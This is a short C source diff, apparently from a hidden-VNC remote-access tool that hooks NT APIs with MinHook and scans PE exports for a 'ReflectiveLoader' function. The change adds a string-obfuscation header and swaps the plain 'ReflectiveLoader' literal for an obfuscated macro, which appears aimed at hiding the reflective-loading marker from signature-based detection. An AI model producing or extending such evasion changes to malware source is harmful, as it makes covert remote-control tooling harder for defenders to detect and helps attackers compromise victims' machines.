@@ -7,6 +7,7 @@ extern "C" {
 
 #include "NtApiHooks.h"
 #include "MinHook.h"
+#include "obfstr.h"
 #include <stdio.h>
 #include <string.h>
 
@@ -845,7 +846,7 @@ static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *
             BOOL found = FALSE;
             for (DWORD k = 0; nameFO + k < peSize && name[k] != 0; k++) {
                 if (name[k] == 'R' && nameFO + k + 16 <= peSize) {
-                    if (memcmp(&name[k], "ReflectiveLoader", 16) == 0) {
+                    if (memcmp(&name[k], OBFS(_enc_ReflectiveLoader), 16) == 0) {
                         found = TRUE;
                         break;
                     }
